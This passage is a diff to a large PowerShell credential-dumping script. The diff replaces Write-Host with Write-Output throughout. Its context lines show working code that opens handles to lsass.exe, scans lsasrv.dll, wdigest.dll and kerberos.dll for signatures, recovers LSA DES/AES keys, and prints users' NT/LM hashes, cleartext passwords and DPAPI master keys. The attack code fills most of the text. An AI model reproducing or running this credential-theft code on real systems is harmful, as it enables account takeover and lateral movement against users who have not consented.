-			Write-Host ("[-] Unsupported build number = {0})" -f ($Dump["SysInfo"]["BuildNumber"]))
+			Write-Output ("[-] Unsupported build number = {0})" -f ($Dump["SysInfo"]["BuildNumber"]))
 			return $Null
 		}
 		ElseIf (($Global:MINBUILD_WIN_VISTA -le $Dump["SysInfo"]["BuildNumber"]) -and ($Dump["SysInfo"]["BuildNumber"] -lt $Global:MINBUILD_WIN_8))
@@ -6720,7 +6720,7 @@ function LSASS-Get-MSVSecrets($Dump, $LSADecryptor)
 		# Processor x64
 		If ($Dump["SysInfo"]["BuildNumber"] -lt $Global:MINBUILD_WIN_VISTA)
 		{
-			Write-Host ("[-] Unsupported build number = {0})" -f ($Dump["SysInfo"]["BuildNumber"]))
+			Write-Output ("[-] Unsupported build number = {0})" -f ($Dump["SysInfo"]["BuildNumber"]))
 			return $Null
 		}
 		ElseIf (($Global:MINBUILD_WIN_VISTA -le $Dump["SysInfo"]["BuildNumber"]) -and ($Dump["SysInfo"]["BuildNumber"] -lt $Global:MINBUILD_WIN_7))
@@ -7101,10 +7101,10 @@ function LSASS-Get-MSVSecrets($Dump, $LSADecryptor)
 	}
 	If (-not $SigPos)
 	{
-		Write-Host ("[-] Unable to find MSV signature into lsasrv.dll module")
+		Write-Output ("[-] Unable to find MSV signature into lsasrv.dll module")
 		return $Null
 	}
-	Write-Host ("[+] Found MSV signature at address 0x{0:X8} into lsasrv.dll module. Parsing entries" -f ($SigPos))
+	Write-Output ("[+] Found MSV signature at address 0x{0:X8} into lsasrv.dll module. Parsing entries" -f ($SigPos))
 
 	# Get logon session count
 	$Addr = $SigPos + $MSVDecryptor["Decryptor_Template"]["Offset2"]
@@ -7203,7 +7203,7 @@ function LSASS-Get-WdigestSecrets($Dump, $LSADecryptor)
 		# Processor x86
 		If ($Dump["SysInfo"]["BuildNumber"] -lt $Global:MINBUILD_WIN_VISTA)
 		{
-			Write-Host ("[-] Unsupported build number = {0})" -f ($Dump["SysInfo"]["BuildNumber"]))
+			Write-Output ("[-] Unsupported build number = {0})" -f ($Dump["SysInfo"]["BuildNumber"]))
 			return $Null
 		}
 		ElseIf (($Global:MINBUILD_WIN_VISTA -le $Dump["SysInfo"]["BuildNumber"]) -and ($Dump["SysInfo"]["BuildNumber"] -lt $Global:MINBUILD_WIN_BLUE))
@@ -7240,7 +7240,7 @@ function LSASS-Get-WdigestSecrets($Dump, $LSADecryptor)
 		# Processor x64
 		If ($Dump["SysInfo"]["BuildNumber"] -lt $Global:MINBUILD_WIN_VISTA)
 		{
-			Write-Host ("[-] Unsupported build number = {0})" -f ($Dump["SysInfo"]["BuildNumber"]))
+			Write-Output ("[-] Unsupported build number = {0})" -f ($Dump["SysInfo"]["BuildNumber"]))
 			return $Null
 		}
 		Else
@@ -7372,10 +7372,10 @@ function LSASS-Get-WdigestSecrets($Dump, $LSADecryptor)
 	}
 	If (-not $SigPos)
 	{
-		Write-Host ("[-] Unable to find Wdigest signature into wdigest.dll module")
+		Write-Output ("[-] Unable to find Wdigest signature into wdigest.dll module")
 		return $Null
 	}
-	Write-Host ("[+] Found Wdigest signature at address 0x{0:X8} into wdigest.dll module. Parsing entries" -f ($SigPos))
+	Write-Output ("[+] Found Wdigest signature at address 0x{0:X8} into wdigest.dll module. Parsing entries" -f ($SigPos))
 
 	# Iterate over Wdigest entries
 	$Addr = $SigPos + $WdigestDecryptor["Decryptor_Template"]["First_Entry_Offset"]
@@ -8310,7 +8310,7 @@ function LSASS-Get-KerberosSecrets($Dump, $LSADecryptor)
 		# Processor x86
 		If ($Dump["SysInfo"]["BuildNumber"] -lt $Global:MINBUILD_WIN_VISTA)
 		{
-			Write-Host ("[-] Unsupported build number = {0})" -f ($Dump["SysInfo"]["BuildNumber"]))
+			Write-Output ("[-] Unsupported build number = {0})" -f ($Dump["SysInfo"]["BuildNumber"]))
 			return $Null
 		}
 		ElseIf (($Global:MINBUILD_WIN_VISTA -le $Dump["SysInfo"]["BuildNumber"]) -and ($Dump["SysInfo"]["BuildNumber"] -lt $Global:MINBUILD_WIN_7))
@@ -8389,7 +8389,7 @@ function LSASS-Get-KerberosSecrets($Dump, $LSADecryptor)
 		# Processor x64
 		If ($Dump["SysInfo"]["BuildNumber"] -lt $Global:MINBUILD_WIN_VISTA)
 		{
-			Write-Host ("[-] Unsupported build number = {0})" -f ($Dump["SysInfo"]["BuildNumber"]))
+			Write-Output ("[-] Unsupported build number = {0})" -f ($Dump["SysInfo"]["BuildNumber"]))
 			return $Null
 		}
 		ElseIf (($Global:MINBUILD_WIN_VISTA -le $Dump["SysInfo"]["BuildNumber"]) -and ($Dump["SysInfo"]["BuildNumber"] -lt $Global:MINBUILD_WIN_7))
@@ -8785,10 +8785,10 @@ function LSASS-Get-KerberosSecrets($Dump, $LSADecryptor)
 	}
 	If (-not $SigPos)
 	{
-		Write-Host ("[-] Unable to find Kerberos signature into kerberos.dll module")
+		Write-Output ("[-] Unable to find Kerberos signature into kerberos.dll module")
 		return $Null
 	}
-	Write-Host ("[+] Found Kerberos signature at address 0x{0:X8} into kerberos.dll module. Parsing entries" -f ($SigPos))
+	Write-Output ("[+] Found Kerberos signature at address 0x{0:X8} into kerberos.dll module. Parsing entries" -f ($SigPos))
 
 	# Iterate over Kerberos entries
 	$Addr = $SigPos + $KerberosDecryptor["Decryptor_Template"]["First_Entry_Offset"]
@@ -8875,7 +8875,7 @@ function LSASS-Get-DPAPISecrets($Dump, $LSADecryptor)
 		# Processor x86
 		If ($Dump["SysInfo"]["BuildNumber"] -lt $Global:MINBUILD_WIN_VISTA)
 		{
-			Write-Host ("[-] Unsupported build number = {0})" -f ($Dump["SysInfo"]["BuildNumber"]))
+			Write-Output ("[-] Unsupported build number = {0})" -f ($Dump["SysInfo"]["BuildNumber"]))
 			return $Null
 		}
 		ElseIf ($Dump["SysInfo"]["BuildNumber"] -lt $Global:MINBUILD_WIN_8)
@@ -8899,7 +8899,7 @@ function LSASS-Get-DPAPISecrets($Dump, $LSADecryptor)
 		# Processor x64
 		If ($Dump["SysInfo"]["BuildNumber"] -lt $Global:MINBUILD_WIN_VISTA)
 		{
-			Write-Host ("[-] Unsupported build number = {0})" -f ($Dump["SysInfo"]["BuildNumber"]))
+			Write-Output ("[-] Unsupported build number = {0})" -f ($Dump["SysInfo"]["BuildNumber"]))
 			return $Null
 		}
 		ElseIf (($Global:MINBUILD_WIN_VISTA -le $Dump["SysInfo"]["BuildNumber"]) -and ($Dump["SysInfo"]["BuildNumber"] -lt $Global:MINBUILD_WIN_7))
@@ -9023,13 +9023,13 @@ function LSASS-Get-DPAPISecrets($Dump, $LSADecryptor)
 	}
 	If ((-not $SigPos_LSASrv) -and (-not $SigPos_DPAPISrv))
 	{
-		Write-Host ("[-] Unable to find DPAPI signature into both lsasrv.dll and dpapisrv.dll module")
+		Write-Output ("[-] Unable to find DPAPI signature into both lsasrv.dll and dpapisrv.dll module")
 		return $Null
 	}
 
 	If ($SigPos_LSASrv)
 	{
-		Write-Host ("[+] Found DPAPI signature at address 0x{0:X8} into lsasrv.dll module. Parsing entries" -f ($SigPos_LSASrv))
+		Write-Output ("[+] Found DPAPI signature at address 0x{0:X8} into lsasrv.dll module. Parsing entries" -f ($SigPos_LSASrv))
 
 		# Iterate over DPAPI entries
 		$Addr = $SigPos_LSASrv + $DPAPIDecryptor["Decryptor_Template"]["First_Entry_Offset"]
@@ -9046,7 +9046,7 @@ function LSASS-Get-DPAPISecrets($Dump, $LSADecryptor)
 
 	If ($SigPos_DPAPISrv)
 	{
-		Write-Host ("[+] Found DPAPI signature at address 0x{0:X8} into dpapisrv.dll module. Parsing entries" -f ($SigPos_DPAPISrv))
+		Write-Output ("[+] Found DPAPI signature at address 0x{0:X8} into dpapisrv.dll module. Parsing entries" -f ($SigPos_DPAPISrv))
 
 		# Iterate over DPAPI entries
 		$Addr = $SigPos_DPAPISrv + $DPAPIDecryptor["Decryptor_Template"]["First_Entry_Offset"]
@@ -9175,7 +9175,7 @@ function LSASS-Get-LSAEncryptionKeys($Dump)
 		$Is64Bit = $False
 		If ($Dump["SysInfo"]["BuildNumber"] -lt $Global:MINBUILD_WIN_VISTA)
 		{
-			Write-Host ("[-] Unsupported build number = {0})" -f ($Dump["SysInfo"]["BuildNumber"]))
+			Write-Output ("[-] Unsupported build number = {0})" -f ($Dump["SysInfo"]["BuildNumber"]))
 			return $Null
 		}
 		ElseIf (($Global:MINBUILD_WIN_VISTA -le $Dump["SysInfo"]["BuildNumber"]) -and ($Dump["SysInfo"]["BuildNumber"] -lt $Global:MINBUILD_WIN_7))
@@ -9268,7 +9268,7 @@ function LSASS-Get-LSAEncryptionKeys($Dump)
 		# Processor x64
 		If ($Dump["SysInfo"]["BuildNumber"] -le $Global:MINBUILD_WIN_2K3)
 		{
-			Write-Host ("[-] Unsupported build number = {0})" -f ($Dump["SysInfo"]["BuildNumber"]))
+			Write-Output ("[-] Unsupported build number = {0})" -f ($Dump["SysInfo"]["BuildNumber"]))
 			return $Null
 		}
 		ElseIf ($Dump["SysInfo"]["BuildNumber"] -lt $Global:MINBUILD_WIN_7)
@@ -9349,7 +9349,7 @@ function LSASS-Get-LSAEncryptionKeys($Dump)
 	}
 	Else
 	{
-		Write-Host ("[-] Unsupported processor architecture = {0}" -f ($Dump["SysInfo"]["ProcessorArchitecture"]))
+		Write-Output ("[-] Unsupported processor architecture = {0}" -f ($Dump["SysInfo"]["ProcessorArchitecture"]))
 		return $Null
 	}
 
@@ -9383,10 +9383,10 @@ function LSASS-Get-LSAEncryptionKeys($Dump)
 	}
 	If (-not $SigPos)
 	{
-		Write-Host ("[-] Unable to find LSA signature into lsasrv.dll module")
+		Write-Output ("[-] Unable to find LSA signature into lsasrv.dll module")
 		return $Null
 	}
-	Write-Host ("[+] Found LSA signature at address 0x{0:X8} into lsasrv.dll module" -f ($SigPos))
+	Write-Output ("[+] Found LSA signature at address 0x{0:X8} into lsasrv.dll module" -f ($SigPos))
 
 	<### LSA Decryptor ###>
 
@@ -9422,7 +9422,7 @@ function LSASS-Get-LSAEncryptionKeys($Dump)
 				$LSATemplate["Key_Handle_Struct"].Invoke($BuffDES, $DESHandleStruct, $BaseAddrDES)
 				If (@(Compare-Object $DESHandleStruct["Tag"] $LSATemplate["Key_Handle_Struct_Tag"] -SyncWindow 0).Length -ne 0)
 				{
-					Write-Host ("[-] Invalid tag into DES Handle structure")
+					Write-Output ("[-] Invalid tag into DES Handle structure")
 					return $Null
 				}
 
@@ -9436,7 +9436,7 @@ function LSASS-Get-LSAEncryptionKeys($Dump)
 				}
 				Else
 				{
-					Write-Host ("[-] Invalid tag into DES structure")
+					Write-Output ("[-] Invalid tag into DES structure")
 					return $Null
 				}
 			}
@@ -9458,7 +9458,7 @@ function LSASS-Get-LSAEncryptionKeys($Dump)
 				$LSATemplate["Key_Handle_Struct"].Invoke($BuffAES, $AESHandleStruct, $BaseAddrAES)
 				If (@(Compare-Object $AESHandleStruct["Tag"] $LSATemplate["Key_Handle_Struct_Tag"] -SyncWindow 0).Length -ne 0)
 				{
-					Write-Host ("[-] Invalid tag into AES Handle structure")
+					Write-Output ("[-] Invalid tag into AES Handle structure")
 					return $Null
 				}
 
@@ -9472,16 +9472,16 @@ function LSASS-Get-LSAEncryptionKeys($Dump)
 				}
 				Else
 				{
-					Write-Host ("[-] Invalid tag into AES structure")
+					Write-Output ("[-] Invalid tag into AES structure")
 					return $Null
 				}
 			}
 		}
 	}
 
-	Write-Host ("[...] IV = {0}" -f ([System.BitConverter]::ToString($LSADecryptor["IV"]).Replace("-", "")))
-	Write-Host ("[...] DES key = {0}" -f ([System.BitConverter]::ToString($LSADecryptor["DES_Key"]).Replace("-", "")))
-	Write-Host ("[...] AES key = {0}" -f ([System.BitConverter]::ToString($LSADecryptor["AES_Key"]).Replace("-", "")))
+	Write-Output ("[...] IV = {0}" -f ([System.BitConverter]::ToString($LSADecryptor["IV"]).Replace("-", "")))
+	Write-Output ("[...] DES key = {0}" -f ([System.BitConverter]::ToString($LSADecryptor["DES_Key"]).Replace("-", "")))
+	Write-Output ("[...] AES key = {0}" -f ([System.BitConverter]::ToString($LSADecryptor["AES_Key"]).Replace("-", "")))
 
 	return $LSADecryptor
 }
@@ -9566,7 +9566,7 @@ function GetModulesAndPages($pHandle, $SysInfo)
 		$Succeeded = [WinProcAPI]::EnumProcessModules($pHandle, $ModulesHandles, $cb, [ref] $lpcbNeeded)
 		If (-not $Succeeded)
 		{
-			Write-Host ("[-] EnumProcessModules() failed")
+			Write-Output ("[-] EnumProcessModules() failed")
 			return $Null
 		}
 	}
@@ -9580,7 +9580,7 @@ function GetModulesAndPages($pHandle, $SysInfo)
 		$BytesWritten = [WinProcAPI]::GetModuleFileNameEx($pHandle, $ModulesHandles[$i], $ModuleFilePath, $ModuleFilePathSize)
 		If (-not $BytesWritten)
 		{
-			Write-Host ("[-] GetModuleFileNameEx() failed")
+			Write-Output ("[-] GetModuleFileNameEx() failed")
 			return $Null
 		}
 
@@ -9596,7 +9596,7 @@ function GetModulesAndPages($pHandle, $SysInfo)
 		$Succeeded = [WinProcAPI]::GetModuleInformation($pHandle, $ModulesHandles[$i], [ref] $ModuleInfo, [System.Runtime.InteropServices.Marshal]::SizeOf($ModuleInfo))
 		If (-not $Succeeded)
 		{
-			Write-Host ("[-] GetModuleInformation() failed")
+			Write-Output ("[-] GetModuleInformation() failed")
 			return $Null
 		}
 
@@ -9619,7 +9619,7 @@ function GetModulesAndPages($pHandle, $SysInfo)
 		$BytesWritten = [WinProcAPI]::VirtualQueryEx($pHandle, $CurrentAddr, [ref] $PageInfo, [System.Runtime.InteropServices.Marshal]::SizeOf($PageInfo))
 		If (-not $BytesWritten)
 		{
-			Write-Host ("[-] VirtualQueryEx() failed")
+			Write-Output ("[-] VirtualQueryEx() failed")
 			return $Null
 		}
 
@@ -9682,13 +9682,13 @@ function Dump-LSASS($Method)
 				$MSV1TimeStamp, $LsassModules, $LsassPages = GetModulesAndPages $LsassHandle $SysInfo
 				If ((-not $LsassModules) -or (-not $LsassPages))
 				{
-					Write-Host ("[-] Unable to get pages info and modules from lsass handle")
+					Write-Output ("[-] Unable to get pages info and modules from lsass handle")
 					return $Null
 				}
 			}
 			Else
 			{
-				Write-Host ("[-] Unable to open lsass process")
+				Write-Output ("[-] Unable to open lsass process")
 				return $Null
 			}
 
@@ -9716,7 +9716,7 @@ function Dump-LSASS($Method)
 				}
 				Else
 				{
-					Write-Host ("[-] NtQuerySystemInformation() failed with error {0}" -f ($Res))
+					Write-Output ("[-] NtQuerySystemInformation() failed with error {0}" -f ($Res))
 					return $Null
 				}
 			}
@@ -9778,7 +9778,7 @@ function Dump-LSASS($Method)
 								}
 								Else
 								{
-									Write-Host ("[-] NtQueryObject() failed with error {0}" -f ($Res))
+									Write-Output ("[-] NtQueryObject() failed with error {0}" -f ($Res))
 									return $Null
 								}
 							}
@@ -9814,20 +9814,20 @@ function Dump-LSASS($Method)
 			$Succeeded = [WinProcAPI]::CloseHandle($pHandle)
 			If (-not $Succeeded)
 			{
-				Write-Host ("[-] CloseHandle() failed")
+				Write-Output ("[-] CloseHandle() failed")
 				return $Null
 			}
 			$Succeeded = [WinProcAPI]::CloseHandle($CurrProcHandle)
 			If (-not $Succeeded)
 			{
-				Write-Host ("[-] CloseHandle() failed")
+				Write-Output ("[-] CloseHandle() failed")
 				return $Null
 			}
 
 			# Try to get pages info and modules from lsass handles
 			If ($LsassHandles.Count -ne 0)
 			{
-				Write-Host ("[+] Found {0} handles to lsass.exe" -f ($LsassHandles.Count))
+				Write-Output ("[+] Found {0} handles to lsass.exe" -f ($LsassHandles.Count))
 
 				$Dumped = $False
 				$HandleId = 0
@@ -9847,7 +9847,7 @@ function Dump-LSASS($Method)
 								$Succeeded = [WinProcAPI]::CloseHandle($LsassHandles[$i])
 								If (-not $Succeeded)
 								{
-									Write-Host ("[-] CloseHandle() failed")
+									Write-Output ("[-] CloseHandle() failed")
 									return $Null
 								}
 							}
@@ -9859,7 +9859,7 @@ function Dump-LSASS($Method)
 
 				If (-not $Dumped)
 				{
-					Write-Host ("[-] Unable to get pages info and modules from lsass handle")
+					Write-Output ("[-] Unable to get pages info and modules from lsass handle")
 					return $Null
 				}
 				Else
@@ -9871,13 +9871,13 @@ function Dump-LSASS($Method)
 			}
 			Else
 			{
-				Write-Host ("[-] Unable to find open handles to lsass.exe")
+				Write-Output ("[-] Unable to find open handles to lsass.exe")
 				return $Null
 			}
 		}
 		default
 		{
-			Write-Host ("[-] Method not implemented")
+			Write-Output ("[-] Method not implemented")
 			return $Null
 		}
 	}
@@ -10031,77 +10031,77 @@ function Parse-LSASS($Dump)
 		ForEach ($LogonSessionKey in $LogonSessions.Keys)
 		{
 			$LogonSession = $LogonSessions[$LogonSessionKey]
-			Write-Host ("[...] Logon Session {0}" -f ($LogonSessionNb))
+			Write-Output ("[...] Logon Session {0}" -f ($LogonSessionNb))
 			$LogonSessionNb += 1
 
-			If ($LogonSession["Authentication_Id"]) { Write-Host ("`tAuthentication ID = {0}" -f ($LogonSession["Authentication_Id"])) } Else { Write-Host "`tAuthentication ID = None" }
-			If ($LogonSession["Session_Id"]) { Write-Host ("`tSession ID = {0}" -f ($LogonSession["Session_Id"])) } Else { Write-Host "`tSession ID = None" }
-			If ($LogonSession["UserName"]) { Write-Host ("`tUserName = {0}" -f ($LogonSession["UserName"])) } Else { Write-Host "`tUserName = None" }
-			If ($LogonSession["Domain"]) { Write-Host ("`tDomain = {0}" -f ($LogonSession["Domain"])) } Else { Write-Host "`tDomain = None" }
-			If ($LogonSession["LogonServer"]) { Write-Host ("`tLogon Server = {0}" -f ($LogonSession["LogonServer"])) } Else { Write-Host "`tLogon Server = None" }
-			If ($LogonSession["LogonTime"]) { Write-Host ("`tLogon Time = {0}" -f ($LogonSession["LogonTime"])) } Else { Write-Host "`tLogon Time = None" }
-			If ($LogonSession["SID"]) { Write-Host ("`tSID = {0}" -f ($LogonSession["SID"])) } Else { Write-Host "`tSID = None" }
-			If ($LogonSession["LUID"]) { Write-Host ("`tLUID = {0}" -f ($LogonSession["LUID"])) } Else { Write-Host "`tLUID = None" }
+			If ($LogonSession["Authentication_Id"]) { Write-Output ("`tAuthentication ID = {0}" -f ($LogonSession["Authentication_Id"])) } Else { Write-Output "`tAuthentication ID = None" }
+			If ($LogonSession["Session_Id"]) { Write-Output ("`tSession ID = {0}" -f ($LogonSession["Session_Id"])) } Else { Write-Output "`tSession ID = None" }
+			If ($LogonSession["UserName"]) { Write-Output ("`tUserName = {0}" -f ($LogonSession["UserName"])) } Else { Write-Output "`tUserName = None" }
+			If ($LogonSession["Domain"]) { Write-Output ("`tDomain = {0}" -f ($LogonSession["Domain"])) } Else { Write-Output "`tDomain = None" }
+			If ($LogonSession["LogonServer"]) { Write-Output ("`tLogon Server = {0}" -f ($LogonSession["LogonServer"])) } Else { Write-Output "`tLogon Server = None" }
+			If ($LogonSession["LogonTime"]) { Write-Output ("`tLogon Time = {0}" -f ($LogonSession["LogonTime"])) } Else { Write-Output "`tLogon Time = None" }
+			If ($LogonSession["SID"]) { Write-Output ("`tSID = {0}" -f ($LogonSession["SID"])) } Else { Write-Output "`tSID = None" }
+			If ($LogonSession["LUID"]) { Write-Output ("`tLUID = {0}" -f ($LogonSession["LUID"])) } Else { Write-Output "`tLUID = None" }
 
 			$MSVNb = 1
 			ForEach ($MSVCred in $LogonSession["MSV_Creds"])
 			{
-				Write-Host ("`t`t*** MSV Credential {0} ***" -f ($MSVNb))
+				Write-Output ("`t`t*** MSV Credential {0} ***" -f ($MSVNb))
 				$MSVNb += 1
 
-				If ($MSVCred["UserName"]) { Write-Host ("`t`tUserName = {0}" -f ($MSVCred["UserName"])) } Else { Write-Host ("`t`tUserName = None") }
-				If ($MSVCred["Domain"]) { Write-Host ("`t`tDomain = {0}" -f ($MSVCred["Domain"])) } Else { Write-Host ("`t`tDomain = None") }
-				If ($MSVCred["LMHash"]) { Write-Host ("`t`tLM = {0}" -f ([System.BitConverter]::ToString($MSVCred["LMHash"]).Replace("-", ""))) } Else { Write-Host ("`t`tLM = None") }
-				If ($MSVCred["NTHash"]) { Write-Host ("`t`tNT = {0}" -f ([System.BitConverter]::ToString($MSVCred["NTHash"]).Replace("-", ""))) } Else { Write-Host ("`t`tNT = None") }
-				If ($MSVCred["SHAHash"]) { Write-Host ("`t`tSHA1 = {0}" -f ([System.BitConverter]::ToString($MSVCred["SHAHash"]).Replace("-", ""))) } Else { Write-Host ("`t`tSHA1 = None") }
+				If ($MSVCred["UserName"]) { Write-Output ("`t`tUserName = {0}" -f ($MSVCred["UserName"])) } Else { Write-Output ("`t`tUserName = None") }
+				If ($MSVCred["Domain"]) { Write-Output ("`t`tDomain = {0}" -f ($MSVCred["Domain"])) } Else { Write-Output ("`t`tDomain = None") }
+				If ($MSVCred["LMHash"]) { Write-Output ("`t`tLM = {0}" -f ([System.BitConverter]::ToString($MSVCred["LMHash"]).Replace("-", ""))) } Else { Write-Output ("`t`tLM = None") }
+				If ($MSVCred["NTHash"]) { Write-Output ("`t`tNT = {0}" -f ([System.BitConverter]::ToString($MSVCred["NTHash"]).Replace("-", ""))) } Else { Write-Output ("`t`tNT = None") }
+				If ($MSVCred["SHAHash"]) { Write-Output ("`t`tSHA1 = {0}" -f ([System.BitConverter]::ToString($MSVCred["SHAHash"]).Replace("-", ""))) } Else { Write-Output ("`t`tSHA1 = None") }
 				If ($MSVCred["DPAPI"])
 				{
-					If (@(Compare-Object $MSVCred["DPAPI"] (New-Object byte[] 16) -SyncWindow 0).Length -ne 0) { Write-Host ("`t`tDPAPI = {0}" -f ([System.BitConverter]::ToString($MSVCred["DPAPI"]).Replace("-", ""))) } Else { Write-Host ("`t`tDPAPI = None") }
+					If (@(Compare-Object $MSVCred["DPAPI"] (New-Object byte[] 16) -SyncWindow 0).Length -ne 0) { Write-Output ("`t`tDPAPI = {0}" -f ([System.BitConverter]::ToString($MSVCred["DPAPI"]).Replace("-", ""))) } Else { Write-Output ("`t`tDPAPI = None") }
 				}
 			}
 
 			$CredmanNb = 1
 			ForEach ($CredmanCred in $LogonSession["Credman_Creds"])
 			{
-				Write-Host ("`t`t*** Credman Credential {0} ***" -f ($CredmanNb))
+				Write-Output ("`t`t*** Credman Credential {0} ***" -f ($CredmanNb))
 				$CredmanNb += 1
 
-				If ($CredmanCred["UserName"]) { Write-Host ("`t`tUserName = {0}" -f ($CredmanCred["UserName"])) } Else { Write-Host ("`t`tUserName = None") }
-				If ($CredmanCred["Domain"]) { Write-Host ("`t`tDomain = {0}" -f ($CredmanCred["Domain"])) } Else { Write-Host ("`t`tDomain = None") }
-				If ($CredmanCred["Password"]) { Write-Host ("`t`tHex Pwd = {0}" -f ([System.BitConverter]::ToString($CredmanCred["Password"]).Replace("-", ""))) } Else { Write-Host ("`t`tHex Pwd = None") }
+				If ($CredmanCred["UserName"]) { Write-Output ("`t`tUserName = {0}" -f ($CredmanCred["UserName"])) } Else { Write-Output ("`t`tUserName = None") }
+				If ($CredmanCred["Domain"]) { Write-Output ("`t`tDomain = {0}" -f ($CredmanCred["Domain"])) } Else { Write-Output ("`t`tDomain = None") }
+				If ($CredmanCred["Password"]) { Write-Output ("`t`tHex Pwd = {0}" -f ([System.BitConverter]::ToString($CredmanCred["Password"]).Replace("-", ""))) } Else { Write-Output ("`t`tHex Pwd = None") }
 			}
 
 			$WdigestNb = 1
 			ForEach ($WdigestCred in $LogonSession["Wdigest_Creds"])
 			{
-				Write-Host ("`t`t*** Wdigest Credential {0} ***" -f ($WdigestNb))
+				Write-Output ("`t`t*** Wdigest Credential {0} ***" -f ($WdigestNb))
 				$WdigestNb += 1
 
-				If ($WdigestCred["UserName"]) { Write-Host ("`t`tUserName = {0}" -f ($WdigestCred["UserName"])) } Else { Write-Host ("`t`tUserName = None") }
-				If ($WdigestCred["Domain"]) { Write-Host ("`t`tDomain = {0}" -f ($WdigestCred["Domain"])) } Else { Write-Host ("`t`tDomain = None") }
-				If ($WdigestCred["Password"]) { Write-Host ("`t`tHex Pwd = {0}" -f ([System.BitConverter]::ToString($WdigestCred["Password"]).Replace("-", ""))) } Else { Write-Host ("`t`tHex Pwd = None") }
+				If ($WdigestCred["UserName"]) { Write-Output ("`t`tUserName = {0}" -f ($WdigestCred["UserName"])) } Else { Write-Output ("`t`tUserName = None") }
+				If ($WdigestCred["Domain"]) { Write-Output ("`t`tDomain = {0}" -f ($WdigestCred["Domain"])) } Else { Write-Output ("`t`tDomain = None") }
+				If ($WdigestCred["Password"]) { Write-Output ("`t`tHex Pwd = {0}" -f ([System.BitConverter]::ToString($WdigestCred["Password"]).Replace("-", ""))) } Else { Write-Output ("`t`tHex Pwd = None") }
 			}
 
 			$KerberosNb = 1
 			ForEach ($KerberosCred in $LogonSession["Kerberos_Creds"])
 			{
-				Write-Host ("`t`t*** Kerberos Credential {0} ***" -f ($KerberosNb))
+				Write-Output ("`t`t*** Kerberos Credential {0} ***" -f ($KerberosNb))
 				$KerberosNb += 1
 
-				If ($KerberosCred["UserName"]) { Write-Host ("`t`tUserName = {0}" -f ($KerberosCred["UserName"])) } Else { Write-Host ("`t`tUserName = None") }
-				If ($KerberosCred["Domain"]) { Write-Host ("`t`tDomain = {0}" -f ($KerberosCred["Domain"])) } Else { Write-Host ("`t`tDomain = None") }
-				If ($KerberosCred["Password"]) { Write-Host ("`t`tHex Pwd = {0}" -f ([System.BitConverter]::ToString($KerberosCred["Password"]).Replace("-", ""))) } Else { Write-Host ("`t`tHex Pwd = None") }
+				If ($KerberosCred["UserName"]) { Write-Output ("`t`tUserName = {0}" -f ($KerberosCred["UserName"])) } Else { Write-Output ("`t`tUserName = None") }
+				If ($KerberosCred["Domain"]) { Write-Output ("`t`tDomain = {0}" -f ($KerberosCred["Domain"])) } Else { Write-Output ("`t`tDomain = None") }
+				If ($KerberosCred["Password"]) { Write-Output ("`t`tHex Pwd = {0}" -f ([System.BitConverter]::ToString($KerberosCred["Password"]).Replace("-", ""))) } Else { Write-Output ("`t`tHex Pwd = None") }
 			}
 
 			$DPAPINb = 1
 			ForEach ($DPAPICred in $LogonSession["DPAPI_Creds"])
 			{
-				Write-Host ("`t`t*** DPAPI Credential {0} ***" -f ($DPAPINb))
+				Write-Output ("`t`t*** DPAPI Credential {0} ***" -f ($DPAPINb))
 				$DPAPINb += 1
 
-				Write-Host ("`t`tMasterKey GUID = {0}" -f ($DPAPICred["Key_GUID"]))
-				Write-Host ("`t`tMasterKey = {0}" -f ([System.BitConverter]::ToString($DPAPICred["MasterKey"]).Replace("-", "")))
-				Write-Host ("`t`tSHA1 MasterKey = {0}" -f ([System.BitConverter]::ToString($DPAPICred["SHA1_MasterKey"]).Replace("-", "")))
+				Write-Output ("`t`tMasterKey GUID = {0}" -f ($DPAPICred["Key_GUID"]))
+				Write-Output ("`t`tMasterKey = {0}" -f ([System.BitConverter]::ToString($DPAPICred["MasterKey"]).Replace("-", "")))
+				Write-Output ("`t`tSHA1 MasterKey = {0}" -f ([System.BitConverter]::ToString($DPAPICred["SHA1_MasterKey"]).Replace("-", "")))
 			}
 		}
 	}
@@ -10114,34 +10114,34 @@ function Parse-LSASS($Dump)
 	{
 		ForEach ($OrphanedCred in $OrphanedCreds)
 		{
-			Write-Host ("[...] Orphaned Credential {0}" -f ($OrphanedCredsNb))
+			Write-Output ("[...] Orphaned Credential {0}" -f ($OrphanedCredsNb))
 			$OrphanedCredsNb += 1
 
 			Switch ($OrphanedCred["CredType"])
 			{
 				"Wdigest"
 				{
-					Write-Host ("`t*** Wdigest Credential ***")
+					Write-Output ("`t*** Wdigest Credential ***")
 
-					If ($OrphanedCred["UserName"]) { Write-Host ("`tUserName = {0}" -f ($OrphanedCred["UserName"])) } Else { Write-Host ("`tUserName = None") }
-					If ($OrphanedCred["Domain"]) { Write-Host ("`tDomain = {0}" -f ($OrphanedCred["Domain"])) } Else { Write-Host ("`tDomain = None") }
-					If ($OrphanedCred["Password"]) { Write-Host ("`tHex Pwd = {0}" -f ([System.BitConverter]::ToString($OrphanedCred["Password"]).Replace("-", ""))) } Else { Write-Host ("`tHex Pwd = None") }
+					If ($OrphanedCred["UserName"]) { Write-Output ("`tUserName = {0}" -f ($OrphanedCred["UserName"])) } Else { Write-Output ("`tUserName = None") }
+					If ($OrphanedCred["Domain"]) { Write-Output ("`tDomain = {0}" -f ($OrphanedCred["Domain"])) } Else { Write-Output ("`tDomain = None") }
+					If ($OrphanedCred["Password"]) { Write-Output ("`tHex Pwd = {0}" -f ([System.BitConverter]::ToString($OrphanedCred["Password"]).Replace("-", ""))) } Else { Write-Output ("`tHex Pwd = None") }
 				}
 				"Kerberos"
 				{
-					Write-Host ("`t*** Kerberos Credential ***")
+					Write-Output ("`t*** Kerberos Credential ***")
 
-					If ($OrphanedCred["UserName"]) { Write-Host ("`tUserName = {0}" -f ($OrphanedCred["UserName"])) } Else { Write-Host ("`tUserName = None") }
-					If ($OrphanedCred["Domain"]) { Write-Host ("`tDomain = {0}" -f ($OrphanedCred["Domain"])) } Else { Write-Host ("`tDomain = None") }
-					If ($OrphanedCred["Password"]) { Write-Host ("`tHex Pwd = {0}" -f ([System.BitConverter]::ToString($OrphanedCred["Password"]).Replace("-", ""))) } Else { Write-Host ("`tHex Pwd = None") }
+					If ($OrphanedCred["UserName"]) { Write-Output ("`tUserName = {0}" -f ($OrphanedCred["UserName"])) } Else { Write-Output ("`tUserName = None") }
+					If ($OrphanedCred["Domain"]) { Write-Output ("`tDomain = {0}" -f ($OrphanedCred["Domain"])) } Else { Write-Output ("`tDomain = None") }
